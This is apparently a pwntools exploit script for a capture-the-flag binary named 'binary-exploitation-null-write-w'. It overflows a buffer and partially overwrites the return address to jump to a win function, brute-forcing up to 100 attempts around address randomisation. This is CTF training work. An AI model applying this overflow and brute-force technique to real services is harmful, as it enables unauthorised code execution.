from pwn import *
from grwnapy.pwn import find_offset


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './challenge/binary-exploitation-null-write-w'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")
payload = flat([
    b"A"*2,
    0x0,
])
# Pass in pattern_size, get back EIP/RIP offset
offset = find_offset(exe, payload+cyclic(500))
win = 0x1df1
main = 0x20a1
# Start program
for i in range(100):
    io = start()

    # Build the payload
    payload = flat([
        b"A"*2,
        0x0,
        b"A"*offset
    ])
    payload += p16(int("0x13ad", 16))

    # Send the payload
    io.send(payload)
    res = io.recvall()
    if b"pwn" in res:
        print(b"A"*300)
        print(res)
        break
# Got Shell?
# io.interactive()
